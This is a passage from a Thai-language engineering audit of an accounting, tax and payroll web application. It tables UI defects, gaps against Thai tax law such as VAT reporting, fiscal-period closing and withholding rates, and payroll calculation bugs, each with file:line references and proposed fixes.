|---|---|---|---|---|---|---|
| A1 | P1 | simple.html:197,202,218,222 (ไม่โหลด layout.js) · login.html:243,367 removeItem('currentCompany') | หน้าแรกหลังล็อกอิน (uiMode default=simple) ไม่มี sidebar/selector/logout · co={} → loadKpis return → skeleton หมุนค้าง + "กรุณาเลือกบริษัท" โดยไม่มีที่ให้เลือก | ผู้ใช้ทุกคนทุกครั้งที่ล็อกอิน | simple.html โหลด layout.js (หรือยุบตาม R1) | M |
| A2 | P1 | app.html:56-58 · simple.html:141 · getting-started.html:174 (`&create=`/`?create=`) · documents.html/purchases.html ไม่มี params.get('create') | CTA "สร้างใบเสนอราคา/ใบกำกับ/ซื้อสินค้า" บนแดชบอร์ดทั้งสองโหมด + step 8 ของ checklist กดแล้วได้ลิสต์เปล่า | silent no-op ที่จุดสำคัญสุดของผู้ใช้ใหม่ (documents.html รองรับ `openCreate=revenue\|expense&type=` อยู่แล้ว) | เปลี่ยนเป็น ?openCreate=…&type=… + purchases.html รับ create หรือ redirect | S |
| A3 | P1 | index.html:798 `?plan=${lower}` · register.html ไม่อ่าน ?plan (grep=0) radio checked=FreeTrial | กด "เลือก Pro" จากตารางราคา → สมัครได้ FreeTrial เงียบ | conversion/เงิน | อ่าน ?plan match case-insensitive + ติ๊ก | S |
| A4 | P1 | layout.js:368-391,400-422,480-492 (จำลอง render ด้วย node) | simple mode: "เบิกค่าใช้จ่าย" ไปอยู่ใต้ "POS หน้าร้าน" (หมวดแม่ไม่อยู่ใน SIMPLE_SECTIONS แต่ item อยู่ใน SIMPLE_ALLOWED → inGroup ค้าง) · หมวด "ซื้อ/รายจ่าย" ว่างเปล่า | โหมดง่ายไม่มีทางบันทึกบิลผู้ขายจาก sidebar | เพิ่ม purchases/payments ใน SIMPLE_ALLOWED + แก้ walk loop flush() | M |
| A5 | P1 | review-queue.html:7 `<link href="/css/layout.css">` (ไม่มีไฟล์ มีแค่ style.css) · 0 inbound · OcrController:1003 endpoint ทำงาน | หน้าคิว review OCR orphan + ไม่มีสไตล์ | | แก้ css + เพิ่ม navItems (จำเป็นเพื่อให้ roles.html มีช่องติ๊ก) | S |
| A6 | P1 | settings-features.html:133-148,207-232 MENU_GROUPS สำเนามือ | 11 id ผี (inventory, warehouses, currencies, chart-of-accounts, vat, rd-export, executive-dashboard, cms-edit, users, audit-log, approvals) ติ๊กซ่อนแล้วไม่มีผล · ขาด 64/110 เมนู · label โชว์ raw id | defect class เดียวกับ roles.html:153 ที่แก้แล้ว | สร้างจาก Layout.navItems runtime | S |
| A7 | P2 | command-palette.js:19 | Ctrl+K "ไปหน้าหลัก" → /index.html = landing page | เตะผู้ใช้ออกหน้าการตลาด · ผิด resolver dashboardUrl (layout.js:73) | Layout.goDashboard() | S |
| A8 | P2 | command-palette.js:28-30 `?action=new&type=` | 3 คำสั่ง "+" ไม่ทำงาน (documents อ่านแต่ openCreate) | | เปลี่ยนเป็น openCreate | S |
| A9 | P2 | purchases.html:100 `/js/export-util.js` (ไม่มีไฟล์ ของจริง export.js) · guard :215,235,261 | ปุ่ม export ทั้ง toolbar/bulk ไม่ render เลย ไม่มี error | | แก้ src | S |
| A10 | P2 | layout.js:645-668 · settings.html:2387-2403 | เมนูที่เจ้าของซ่อนทั้งบริษัท: ผู้ใช้ติ๊กเปิดแล้วไม่มีผล ไม่มีคำอธิบาย · ติ๊กครั้งเดียว = คัดลอก ownerHiddenMenuIds ลง localStorage ถาวร (เจ้าของเลิกซ่อนแล้วผู้ใช้ยังไม่เห็น) | silent no-op (roles.html:301-309 มีป้ายแล้วแต่หน้านี้ไม่มี) | seed จาก local list อย่างเดียว + ป้าย "ซ่อนทั้งบริษัท" disable | S |
| A11 | P2 | settings.html:41,45,46 `.advanced-only` · style.css:781 · layout.js:890-892,417 etaxOnly | แท็บ e-Tax/อนุมัติ/ลำดับเลขที่ ซ่อนใน simple + เมนู etax ซ่อนจนกว่า etaxEnabled ⇒ วงจรปิด: simple mode เปิด e-Tax ไม่ได้ · ตั้ง prefix เลขที่ (§86/4) ไม่ได้ | | ถอด .advanced-only จาก etax/numbering | S |
| A12 | P2 | getting-started.html:121-127 `vatRegistered !== undefined` · SettingsDtos.cs:145 bool non-nullable | step "จด VAT" ✅ ตั้งแต่วินาทีแรก (เงื่อนไขจริงเสมอ) | บริษัทจด VAT ไม่ถูกเตือนให้ติ๊ก ⇒ ออกเอกสารไม่มี VAT | เช็คสิ่งที่ผู้ใช้ทำจริง (ฟิลด์ "ตอบแล้ว") | S |
| A13 | P2 | layout.js:711-723 _sectionI18nKey vs ชื่อหมวดจริง (ตรง 1/16) · translations.js:29-34 dead key 14 | หัวหมวด 15/16 ไม่แปล | EN = sidebar ครึ่งไทย | i18n key เป็นฟิลด์บน section object | S |
| A14 | P2 | 18 หน้าโหลด layout.js ไม่โหลด translations.js (getting-started, roles, vat-history, my-signature …) · layout.js:680 fallback label | เมนูเดียวกันชื่อต่างกันแล้วแต่หน้า (21 รายการ เช่น dimensions "สาขาและมิติ" vs "ศูนย์ต้นทุน & มิติ") | ผู้ใช้จำที่ทางไม่ได้ · "สาขาและมิติ" ซ้ำกับเมนู branches | layout.js โหลด translations.js เอง (เหมือน command-palette :104-109) + sync label | S |
| A15 | P2 | simple.html:275 · layout.js:1216-1222 · style.css:635-654 | ป้ายต้อนรับชี้ "ปุ่ม ＋ เขียวมุมขวาล่าง" — FAB ถูกถอดแล้ว (#globalFab ไม่มี) เหลือ CSS 20 บรรทัด | ประโยคแรกของผู้ใช้ใหม่ชี้ปุ่มที่ไม่มี | แก้ข้อความ + ลบ CSS | S |
| A16 | P2 | register.html:258,475,489 · change-password.html:61,166 · roles.html:216 · settings.html:956,1827 · layout.js:337,347 | ฮาร์ดโค้ด /app.html 9 จุด ไม่ผ่าน dashboardUrl() (layout.js:63-72 ห้ามไว้เอง) | simple user ถูกโยนเข้าโหมดเต็ม จอลูกผสม | Layout.goDashboard() / สูตร 1 บรรทัดแบบ accept-invitation:152 | S |
| A17 | P2 | pos-floorplan/pos-kds/pos-reservations/admin-ocr/review-queue เรียก Layout.init(id) ที่ไม่มีใน navItems · layout.js:298-313,330-351 · roles.html:153-169 | custom role (strict) hasMenuAccess=false → เด้งออก "ไม่มีสิทธิ์" และแอดมินเปิดให้ไม่ได้ | แคชเชียร์/ครัวเข้าผังโต๊ะ/KDS/จองไม่ได้ | เพิ่มเข้า navItems (hidden) หรือ whitelist sub-page สืบสิทธิ์จากเมนูแม่ | M |
| A18 | P3 | layout.js:363,499 ("64 รายการ") · :805 vs getting-started:46 ("5 ขั้น" จริง 8) | ตัวเลขใน tooltip/คำอธิบายผิด (จริง 110/16) | | คำนวณจาก navItems.length | S |
| A19 | P3 | simple.html:225 toISOString().slice(0,10) | UTC shift — วันที่ 1 ของเดือนก่อน 07:00 ช่วง KPI กลับด้าน | | Layout.toDateInput | S |
| A20 | P3 | reset-password.html:38 vs change-password.html:83-93 vs AuthService.cs:1428-1446 | กติการหัสผ่านสื่อว่าต้องครบ 4 หมวด (จริง 2/4) ไม่มี validator client | | helper เดียว 3 หน้า | S |
| A21 | P3 | approval.html:266,363,374 · sme-config.html:19,247,278,293 · settings.html:815-850 | กฎอนุมัติ CRUD จาก 2 หน้า + สวิตช์อยู่หน้าที่ 3 | | ยุบเหลือ approval.html | M |
| A22 | P3 | layout.js:802 dashboard→/app.html + :435 หน้าหลัก(โหมดง่าย)→/simple.html | simple sidebar มี "หน้าหลัก" 2 อัน ชี้คนละหน้า อันหนึ่งข้ามโหมด | | ซ่อน dashboard จาก SIMPLE_ALLOWED | S |
| A23 | P3 | manifest.json:5 · ไม่มีหน้าไหน `<link rel="manifest">` (pos.html ลิงก์ pos-manifest) · layout.js:726 register SW | PWA ติดตั้งไม่ได้ · start_url /app.html ไม่เคารพ uiMode | SME ใช้มือถือหลัก | inject ผ่าน layout.js + start_url /pages/dashboard.html | S |
| A24 | P3 | style.css:669-673 padding-bottom:68px global vs #mobileBottomNav สร้างจาก layout.js:1226 | หน้าไม่โหลด layout.js (simple.html) ได้ช่องว่าง 68px + หายแถบล่าง | | body:has(#mobileBottomNav) หรือแก้ A1 | S |
| A25 | P3 | accept-invitation.html:144-154 currentCompany={id} ไม่มี name · simple.html:209 | สมาชิกใหม่เห็น "กรุณาเลือกบริษัท" ทั้งที่เพิ่งเข้าสำเร็จ | first-run moment | เก็บ name / แก้ A1 | S |

## หน้า orphan/ไม่มีใครเรียก: review-queue.html 🔴 · deposits.html/dashboard.html = redirect stub ตั้งใจ 🟢 · pos-floorplan/kds/reservations + admin-ocr เข้าได้แต่ไม่มีใน navItems 🟡 (A17) · #globalFab CSS 🔴 · manifest.json 🔴 · nav.sections.* 14 dead key 🔴 · PermissionKeys.Catalog ถูกใช้จริง 🟢
## Onboarding จริง 9 ขั้น 6 หน้า: 1 ขั้นเขียวเสมอ (A12) · รหัสสาขา §86/4 + prefix เลขที่ + เทมเพลต/แบรนด์ ไม่อยู่ใน checklist · แบนเนอร์ setup แสดงเฉพาะ /app.html (layout.js:1334-1339) ⇒ ล็อกอินครั้ง 2 ไป simple ไม่เตือนอีก · getting-started step 3 บอก "seed ผังตอนสร้างบริษัท" แต่จริง seed ตอนกด "ตั้งค่าเสร็จสิ้น" (settings.html:1809-1817) · ควร default: สาขา 00000 (wizard layout.js:1454 ทำแล้ว settings ไม่) · VAT 7% · prefix · fiscal period ปีปัจจุบัน · PaymentTerms 30
## เมนู 110/16 หมวด: เสนอจัดตามงาน 9 หมวด (ขาย=ขาย+POS+ออนไลน์ · ซื้อ&จ่าย+cheques/petty-cash · เงิน&ธนาคาร · ภาษี · บัญชี · รายงาน · ข้อมูลหลัก · คน · ตั้งค่า+API) · ดัน document-scan/undue-vat/wht-credit/tax-remittance ขึ้น · ยุบเป็นแท็บ (multi-currency+fx-reval · budget+cost-report+fpa · leave×3 · subscription×3 · import×4) เหลือ ~75
## Re-design: R1 ยุบสองแดชบอร์ดเหลือ /app.html เดียว uiMode = จำนวนเมนู (ปิด A1,A15,A19,A24,A16,A4,A11,A22 พร้อมกัน) · R2 ทุกรายการเมนูจาก navItems แหล่งเดียว (settings-features, command-palette, SIMPLE_ALLOWED เป็นฟิลด์บน navItem) · R3 checklist เป็นทางเดิน (เพิ่มขั้นที่ขาด + deep-link เข้า modal/แท็บจริง + แถบบน dashboard ทุกหน้า) · R4 i18n: i18n.js:16-17 auto-detect navigator.language ⇒ ผู้ใช้ไทยบน Chrome EN ถูกสลับ ทั้งที่ครอบ ~9% (909 data-i18n/~10,400 · 61/119 หน้าไม่มี data-i18n · nav 44/110 ไม่มีคีย์) → default th เสมอ แล้วเลือกทางเดียว · R5 checker: dead_link_check ครอบ <link href>/<script src> (จับ A5,A9) + checker "query param ที่ส่งแต่ไม่มีใครอ่าน" (จับ A2,A3,A8)
## ยังไม่ได้อ่าน: เนื้อหาฟอร์มของ 100+ หน้าฟีเจอร์ · admin/* · connect/* · storefront/portal · ไม่ได้ทดสอบ runtime


# ทีม C — บัญชี/ภาษี core (verified by main: T-01, T-02, T-03 ✔)

## Compliance checklist A–M (สถานะจริง)
| ข้อ | สถานะ | file:line / หมายเหตุ |
|---|---|---|
| A §86/4 8 รายการ · mod-11 · BranchCode · gap-free · §86/9-10 CN/DN | ✅ มี+ถูกเรียก | TaxInvoiceCompletenessChecker → DocumentService:13239-13268 · ThaiTaxId:57-70 · TaxBranchCode/DocumentIssuerBranch · DocumentNumberGenerator+AdvisoryLockKey · CN cap :8481-8493 |
| A ห้ามแก้ย้อนหลัง | ⚠️ ครึ่งเดียว | บล็อกแก้ Approved (:1937) ✅ แต่ `CancelledByDocumentId`/`ReplacedByDocumentId` grep=0 — ไม่มีสายโยงใบยกเลิก→ใบใหม่ |
| A §86/6 ใบย่อ | 🔴 ไม่มีด่าน | `IsRetailApproved`/`PhoR06ApprovedDate`/`InputVatBlocked` grep=0 — พิมพ์หัว "อย่างย่อ" จาก "ผู้ซื้อไม่ครบ" ล้วน (T-07) |
| B §82/5(1) | ✅ | :13239-13268 → 11640 |
| B §82/5(2) ใบย่อฝั่งซื้อ | 🔴 ไม่มี | |
| B §82/5(3)(4)(6) | ⚠️ ครึ่ง | ผังบัญชีบังคับ ✅ (ChartOfAccountTemplates:523-526, DocumentService:1306-1310) · keyword screener เรียกที่เดียว OcrService:919 — คีย์มือ/CSV/API ไม่ผ่าน (T-12) |
| B §82/5(5) ผู้ไม่มีสิทธิ์ออก | 🔴 ไม่มี | |
| B §82/3 6 เดือน | ✅ | TaxService:857-895, InputVatClaimPeriodRules:125-145 |
| C §87 3 วันทำการ | 🔴 ไม่มี | grep=0 |
| C chronological | ✅ | TaxService:1484 |
| C §87(3) รายงานสินค้า gate BusinessType | 🔴 ไม่มี | |
| C retention 5 ปี | ⚠️ ครึ่ง | นับจาก DocumentDate ไม่ใช่ max(filing, fyEnd) (T-11) |
| C tax point §78/78-1/78-2 · VAT period ใช้ TaxPointDate | ✅ | TaxPointResolver:47-81 · TaxService:179 |
| D §81/1 1.8 ล. | 🔴 ไม่มี | grep=0 (T-19) |
| D แยก 7%/0%/ยกเว้น | 🔴 พัง | T-01 |
| E อัตรา WHT | ✅ backend / 🔴 wht.html สำเนามือ | ThaiWhtRateTable:39-76 → wht-credit.html ✅ · wht.html ❌ (T-06) |
| E ฿1,000 สะสม | 🔴 มีแต่ไม่มี call site | ThaiWhtRateTable:103,109-116 (T-05) |
| E 50 ทวิ 2 ฉบับ | ⚠️ ครึ่ง | ออกได้แต่ไม่แยกสองไฟล์ |
| E กำหนดยื่น+วันหยุด | ⚠️ ครึ่ง | เลื่อน ส/อา ✅ ไม่อ่าน PublicHolidays (Payroll.cs:428) (T-10) |
| E DTA | 🔴 ไม่มี | |
| F e-Tax | ✅ (ไม่ได้ตรวจลึก) | |
| G ห้าม LIFO | ✅ โดยโครงสร้าง (enum ไม่มี) | AllEnums:288-298 |
| G บทที่ 9 ค่าเผื่อหนี้สงสัยจะสูญ | 🔴 ไม่มี | มีแค่ aging bucket (AgingReportService:126-155) (T-18) |
| G PPE | ✅ / ⚠️ | ที่ดิน=None จาก classifier ✅ · สร้างมือไม่ validate (T-15) · ไม่มี UnitsOfProduction |
| G FX | ✅ ถูกเรียก | FxRevaluationService → fx-reval.html · ปัดเศษ (T-14) |
| H XBRL อ่าน FiscalYearStartMonth | ✅ | DbdXbrlExportService:85-93 |
| I ภ.ง.ด.50 | 🔴 ไม่มี exporter | ITaxFilingExportService (T-08) |
| I ภ.ง.ด.51 · SME rate | ✅ | TaxFilingExportService:937-1021 |
| I Penalty 20% §67ตรี | 🔴 คอมเมนต์เท่านั้น | :934,976 (T-19) |
| L §65ตรี | ✅ 15 RuleCode ยกเว้น (7) บริจาค | Section65TerValidator → DocumentService:11540 → TaxService:2017 (T-09) |
| M tenant/audit hash/เลขตอน Approve/RuleCode | ✅ | AuditHashChain → DbContext:3372 + AuditTrailService:119 |

| ID | ระดับ | file:line | อาการ | ผลกระทบ | แก้ | ขนาด |
|---|---|---|---|---|---|---|
| T-01 | P0 | TaxService.cs:173 (`&& d.VatAmount != 0`) · :443-455 · PdfGenerationService.TaxReport.cs:184-188,216-217 | ใบขาย 0% ล้วน (ส่งออก) และยกเว้นล้วนไม่ถูกโหลดเข้ารายงานเลย ⇒ ช่อง 3/4 ของ ภ.พ.30 = 0 เสมอ · บรรทัดยกเว้นในใบผสมกองรวมไม่แยกซื้อ/ขาย แล้ว ComposePp30 ยัดเข้า "ยอดขายยกเว้น" | §80/1, §81, §87 · ผู้ส่งออกยื่น 0% = 0 · ซื้อสินค้ายกเว้นถูกรายงานเป็นยอดขาย | predicate `VatAmount != 0 \|\| Lines.Any(VatRate <= 0)` · แยก exempt sales/purchases · bucket ZERO_RATED · R5 Pp30Box enum ตัดสินตอนสร้างแถว | M |
| T-02 | P0 | AccountingService.cs:1973-1986 (P&L ไม่ตัด closing) · :2478,2484-2610 EntryDate=period.EndDate · FiscalPeriod รายเดือน (JournalEntry.cs:80-82, :2179) | "ปิดงวด" เดือน ม.ค. สร้าง CL-YYYYMM ปิด P&L เข้ากำไรสะสมทันที ⇒ งบกำไรขาดทุน ม.ค.–ธ.ค. รายได้ ม.ค.=0 | ไหลไป XBRL DBD (DbdXbrlExportService:93) + ฐาน ภ.ง.ด.51 (:960-973) + CIT report | ธง `JournalEntry.IsClosingEntry` + กรองที่ resolver กลาง · CloseFiscalPeriodAsync ทำแค่ล็อก · YearEndClose ตัวเดียวปิด P&L (R1) | M |
| T-03 | P0 | AccountingService.YearEndClose.cs:93,98-99 (Jan 1–Dec 31 ตายตัว, FiscalYearStartMonth grep=0 ในไฟล์) | YearEndClose ตรึงรอบ ม.ค.–ธ.ค. เสมอ ขณะที่ XBRL/PND51/CIT อ่าน FiscalYearStartMonth ถูก | บริษัทรอบ เม.ย.–มี.ค. กำไรสะสมผิด + งบ DBD ผิด · ตัวเลขสองชุดในระบบเดียว | Helpers/FiscalYear.RangeFor(company, year) ตัวเดียว (R3) + เทสต์ start=4 | S |
| T-04 | P1 | DocumentService.cs:11709-11711 ResolveFiscalPeriodAsync ไม่ดู Status · caller :2591 Unclaim · :2696 Reclaim · :3111 RealizeDeposit · :3600 Refund · :3899 ApplyDeposit · :4216 · FxRevaluationService | โพสต์ JE เข้างวดที่ปิดแล้วได้ด้วยวันที่จากผู้ใช้ (RealizeDate/RefundDate/ApplyDate) — ValidateFiscalPeriodOpenForDateAsync (:2706) กันไว้แค่ JE มือ + TryReclassifyUndueOutputVat | งบที่ออกแล้วเปลี่ยนย้อนหลังเงียบ | เปลี่ยนเป็น ResolveOpenFiscalPeriodAsync ที่ throw (R2) · grep call site ทั้งหมด | S |
| T-05 | P1 | ThaiWhtRateTable.cs:103,109-116,90-95 | ShouldWithhold/MinimumThresholdBaht/RateFor 0 call site | ท.ป.4/2528 ข้อ 12 ฿1,000 สะสม — ระบบหักตามที่ผู้ใช้พิมพ์ ⇒ ผู้จ่ายรับผิด §54 | ต่อสายที่ DocumentService:562 + query สะสมต่อคู่ค้า/ปี | M |
| T-06 | P1 | wht.html:847 (6 ประเภท hardcode) · :850 value=3 · :237 incMap สำเนา 2 · :66 dropdown แบบยื่น | ขาด 40(4)(ก)(ข)/40(7)/โฆษณา 2%/ขนส่ง 1% · เลือกประเภทแล้วอัตราไม่เปลี่ยน · ออก ภ.ง.ด.2/54 ไม่ได้ทั้งที่ exporter มี | โฆษณาหัก 3% (ควร 2) · ดอกเบี้ยบุคคล 3% (ควร 15) | สร้างจาก GET wht/income-types (WithholdingTaxCertController:161-163) แบบ wht-credit.html + RateFor | M |
| T-07 | P1 | PdfGenerationService.cs:1478-1486,1343-1353 | หัว "ใบกำกับภาษีอย่างย่อ" ออกจาก "ผู้ซื้อไม่ครบ" โดยไม่ดู ภ.พ.06 · ราคายังเป็น VAT-exclusive ไม่ใช่ 7/107 | §86/6 บริษัทที่ปรึกษาพิมพ์ใบย่อโดยผิดกฎหมาย | Company.IsRetailApproved+PhoR06ApprovedDate + ADD COLUMN · ไม่อนุมัติ → หัว "ใบเสร็จรับเงิน"+บอกทางแก้ | M |
| T-08 | P1 | ITaxFilingExportService.cs | ไม่มี ExportPnd50 (มี 51) | §68 150 วัน — แบบหลักของนิติบุคคล | ประกอบจาก GenerateCitReport + ComputeCit | M |
| T-09 | P1 | Section65TerValidator.cs:216-223 (AddBack:0) · TaxService.cs:1906-1927 (ตัดเฉพาะ (4)) | บริจาค cap 2% ของกำไรสุทธิไม่เคยถูกคำนวณ | §65ตรี(7) กำไรทางภาษีต่ำเกิน | ทำแบบ entertainment cap :2000-2010 คำนวณหลัง netProfit ตัวแรก | M |
| T-10 | P2 | TaxCalendarService.cs:110-116,76-79,122-125 | ภ.ง.ด.50=31 พ.ค./51=31 ส.ค./สบช.3=31 พ.ค. ตายตัว ไม่อ่าน FiscalYearStartMonth · เลื่อน ส/อา แต่ไม่อ่าน PublicHolidays · ไม่มี ภ.ง.ด.54 | รอบไม่ใช่ปฏิทินเตือนผิดทุกแบบ · สงกรานต์ทับ 15 | fyEnd+150 / halfEnd+2m / fyEnd+5m · NextBusinessDay(date, companyId) ตัวเดียว | M |
| T-11 | P2 | DocumentService.cs:5009 RetentionUntil = DocumentDate+5y | นับจากวันเอกสารไม่ใช่ max(fyEnd, filing) | §87/3 · ม.10 สั้นไป ~12-14 เดือน | max(...)+5y + migration GREATEST แถวเดิม | S |
| T-12 | P2 | ProhibitedInputVatScreener เรียกที่เดียว OcrService:919 | ด่าน §82/5(4)(6) ครอบเฉพาะ OCR | คีย์มือ/CSV/API เลือกผัง 53120 ให้ค่าเลี้ยงรับรอง = เคลมผ่าน | เรียกที่ DocumentService:1299 (pure function) | S |
| T-13 | P2 | TaxDtos.cs:69 DocumentId ส่งมาแล้ว · tax.html ไม่มี openDoc · reports.html:188-272 · general-ledger.html ไม่รับ URLSearchParams | รายงานภาษี/งบทดลอง/งบดุล ไม่มี drill-down (journals.html:508,666,824 ทำได้ดี = pattern) | นักบัญชีตรวจก่อนยื่นต้องค้นมือ | ลิงก์ documents.html?openDoc= · general-ledger รับ ?account&from&to · reports แถวคลิกได้ | M |
| T-14 | P2 | FxRevaluationService.cs:172 vs :175-176 | variance คิดจาก current ที่ยังไม่ปัด แต่จอแสดง Round(current) ⇒ ไม่ foot · ไม่มี AwayFromZero · ไม่มีด่านงวดปิด | JE ต่างจอ 0.01/บรรทัด | ปัด cur ก่อนแล้วลบ | S |
| T-15 | P3 | FixedAssetService.CreateAsync vs FixedAssetAccountClassifier.cs:41 | สร้างสินทรัพย์มือ ที่ดิน+StraightLine ได้ | ค่าเสื่อมที่ดินหักภาษีไม่ได้ | ใช้ classifier ตอน create | S |
| T-16 | P3 | TaxFilingExportService.cs:990,1016,1018,1020 | ขาด AwayFromZero — พิสูจน์แล้ว: `/2` ตกกึ่งกลาง 50% (45,000.01/2) · `×0.15` ตก 5% (d≡10 mod 20) · **`×0.20` :1011 ไม่ตกเลย ไม่ใช่บั๊ก** | | เติมที่ 4 จุด + เทสต์แบบ VatRoundingModeTests | S |
| T-17 | — | WhtCreditService.cs:103,163,185 · TaxFilingExportService.cs:505-506 | **ไม่ใช่บั๊ก** — บวก/ลบค่า 2dp Round เป็น no-op | บันทึกกันคนแก้แล้วเขียนว่าเคยมีบั๊ก | — | — |
| T-18 | P2 | grep AllowanceForDoubtful/ArAgingBucket/LossRatePercent=0 | ไม่มีค่าเผื่อหนี้สงสัยจะสูญ | TFRS NPAEs บทที่ 9 | ArAgingBucket entity + job จาก AgingReportService | M |
| T-19 | P2 | grep 1_800_000=0 · 3 วันทำการ=0 · TaxFilingExportService:934,976 คอมเมนต์ | ไม่มี: เตือน 1.8 ล./ปี §85/1 · ด่านลงรายงาน 3 วันทำการ · เงินเพิ่ม 20% ภ.ง.ด.51 | | การ์ด dashboard จาก P&L 12 เดือน · PostedToVatReportAt · pure Pnd51Penalty | M |

## JE ต่อ DocumentType (AutoPostToJournalAsync :12489-14245): ไม่พบ Dr/Cr ผิดที่ยืนยันได้ — ส่วนที่แข็งที่สุด · ข้อควรระวัง: :12693-12710 ไม่พบผัง COGS → LogWarning เดินต่อ · :12670-12677 fallback 21913→21911 log อย่างเดียว (VAT ถึงกำหนดเร็ว 1 งวด) — ควร "ดัง 3 ที่" ผ่าน InternalNotes · PaymentVoucher (:13849-14019) และ GRN (:14019+) ยังไม่ไล่ทีละบรรทัด
## ของที่ไม่มีใครเรียก: ShouldWithhold/MinimumThresholdBaht/RateFor · TaxReportLineResponse.DocumentId · RD-65ter(7) AddBack=0 · PublicHolidays · (ThaiTaxIdValidator ถูกใช้จริง 4 จุด ไม่ใช่ duplicate)
## Re-design: R1 แยกล็อกงวดออกจากปิดบัญชี + IsClosingEntry · R2 ResolveOpenFiscalPeriodAsync เป็นด่าน · R3 FiscalYear.RangeFor ตัวเดียว (4 ที่คำนวณเอง 1 ที่ลืม) · R4 ห้ามพิมพ์อัตราภาษีเป็น literal ใน .html + checker · R5 TaxReportLine ถือ Pp30Box enum ตัดสินตอนสร้างแถว
## ยังไม่ได้อ่าน: PV/GRN JE branch · WithholdingTaxCertService/WhtCertAmountResolver/PndTextFileFormat · EtaxInvoiceService (checklist F) · TaxService.EFiling/Export/RdCompliance · SubLedgerReconciliation · FixedAsset คณิตค่าเสื่อม · tax-remittance.html/accounts.html/wht-credit.html บางส่วน


# ทีม D — Payroll/HR (verified by main: T1,T2,F1,S1,S2 ✔)

| ID | ระดับ | file:line | อาการ | ผลกระทบ (มาตรา) | แก้ | ขนาด |
|---|---|---|---|---|---|---|
| T1 | P0 | PayrollService.cs:1827 (baseDeductions) · Payroll.cs:539 Section42TwiCap ไม่มีผู้อ่าน (grep=0) | PIT ไม่หักค่าใช้จ่าย 50% ไม่เกิน 100,000 | §42ทวิ+§48(1): เงินเดือน 50,000 ระบบหัก 31,925/ปี ควร 20,450 (เกิน 956/เดือน/คน) | `expenseDeduction = Min(annual×0.5, cfg.Section42TwiCap ?? 100000)` หักก่อน baseDeductions + เทสต์ 4 ระดับ | S |
| T2 | P0 | Payroll.cs:84-100 vs PayrollDtos.cs:3-48 | HasSpouseAllowance/ChildAllowanceCount/SecondAndLaterChildren/ParentAllowanceCount/LifeInsurancePremium/RmfSsfContribution/DonationAmount/TaxAllowances 8 ฟิลด์ อ่านที่ :1813-1830 เท่านั้น ไม่มีจุดเขียนทั้งเรพ (มีแค่ ADD COLUMN) | §47(1) ทุกคนได้แค่ 60,000 · คู่สมรส+บุตร 2 เงินเดือน 50,000 ควรเสีย 6,475 ระบบหัก 31,925 (4.9×) | เพิ่มใน Create/Update/Response DTO + แท็บ "ลดหย่อนภาษี" ในโมดัลพนักงาน | M |
| T3 | P0 | PayrollService.cs:1788 · clamp :1840 | `estAnnual = ytd×12÷month` โบนัสถูกคูณเป็นรายปี + `Max(0,…)` คืนภาษีหักเกินไม่ได้ | ม.50(1) โบนัสรวมครั้งเดียว · sim: 50,000+โบนัส 300,000 เดือน 6 ระบบหักรวม 82,221 ควร 61,925 | แยกฐานประจำ/ครั้งคราว · ยกเลิก clamp หรือ carry credit | M |
| T4 | P0 | PayrollService.cs:1788 | annualise ×12÷month สำหรับคนเข้ากลางปี | sim เข้า 1 ก.ค. 150,000: หัก 305→…→36,759 เดือนสุดท้าย (25% ของเงินเดือน) | `remainingPayPeriods` จาก StartDate/EndDate: `est = ytd + monthly × คราวที่เหลือ` | M |
| F1 | P0 | payroll.html:885,896 (runYear = พ.ศ., ไม่ส่ง periodStart/End) vs PayrollService.cs:966,969 | "+ สร้างรอบเงินเดือน" ถูกปฏิเสธ 2 ชั้นทุกครั้ง ("ปีต้องอยู่ระหว่าง 2020…" ทั้งที่จอโชว์ 2569) | สร้างรอบจากหน้าจอไม่เคยสำเร็จ — ทางเดียวคือ POST /runs/import ของคู่ค้า | JS ส่ง ค.ศ.+periodStart/End · server normalize >2400 · PeriodStart/End nullable default ต้น/ปลายเดือน | S |
| S1 | P0 | PayrollDtos.cs:12 `bool IsSubjectToSocialSecurity` (positional ไม่มี default) · payroll.html:791-820 ไม่ส่ง · PayrollService.cs:270 | พนักงานที่เพิ่มจาก payroll.html ได้ false เงียบ (employees.html:414 ส่ง = drift) · UpdateEmployeeRequest ไม่มีฟิลด์นี้ | ม.33: ไม่หัก ไม่นำส่ง ไม่ขึ้น สปส.1-10/1-03 ⇒ เงินเพิ่ม §49 + ลูกจ้างเสียสิทธิ์ · แก้ย้อนหลังผ่าน UI ไม่ได้ | `= true` default + ช่องในฟอร์ม + Update/Response DTO + migration ตรวจแถว false ที่มี SSO>0 | S |
| S2 | P0 | PayrollService.cs:1484-1488 · :840-847 | query บังคับ `e.IsActive` แต่ Terminate ตั้ง IsActive=false ⇒ เงื่อนไข `EndDate >= PeriodStart` เป็นจริงไม่ได้เลย | ลาออกกลางเดือน = หายจากรอบ ไม่ได้เงินเดือนสุดท้าย ไม่อยู่ใน ภ.ง.ด.1/สปส.1-10 เงียบ | `(e.IsActive \|\| (EndDate != null && EndDate >= PeriodStart))` + เทสต์ | S |
| S3 | P0 | PayrollService.cs:1734 | ไม่ prorate ตาม StartDate/EndDate คาบเกี่ยวงวด (prorate เฉพาะลาไม่รับค่าจ้าง) | เข้า 25 ก.ย. ได้เต็มเดือน ⇒ จ่ายเกิน + ฐาน ปกส./ภาษีเกิน (ม.5) | `payableDays` ผ่านฟังก์ชันกลางตัวเดียว (R3) | M |
| S4 | P1 | SsoRateSchedule.cs:25 | เพดาน 17,500 ตั้งแต่ 2026 (875/เดือน) — ยังไม่ verify กับกฎกระทรวงจริง | ถ้ายังไม่มีผล = หักเกิน 125/เดือน/คน มา 9 เดือน | ผูก EffectiveFrom เป็นวันที่ประกาศ + แสดงเลขที่ประกาศ | S (สงสัย) |
| S5 | P1 | PayrollService.cs:3936 (doc "22") vs :4242 (deadline=15) vs TaxCalendarService.cs:58 (eFilingExtra=0) | ComputeSsoLateFee ใช้ 15 เสมอ ไม่มีส่วนขยาย e-Filing ไม่เลื่อนวันหยุด | บริษัทยื่น e-Service วันที่ 20 ถูกคิดเงินเพิ่ม 2% แล้ว post JE จริง ⇒ ยอดธนาคารต่างสลิปถาวร | helper `FilingDeadline.For(form, y, m, isEFiling)` ตัวเดียว (R4) | S |
| S6 | P1 | TaxFilingExportService.cs:605 | สปส.6-09 ReasonCode=1 (ลาออก) ตายตัว ไม่มี TerminationReason บน Employee | เลิกจ้าง vs ลาออก = สิทธิ์ว่างงาน 50%×180 วัน vs 30%×90 วัน — แจ้งเท็จต่อ สปส. | `Employee.TerminationReasonCode` enum จาก /terminate · ไม่ระบุ = บล็อก export | S |
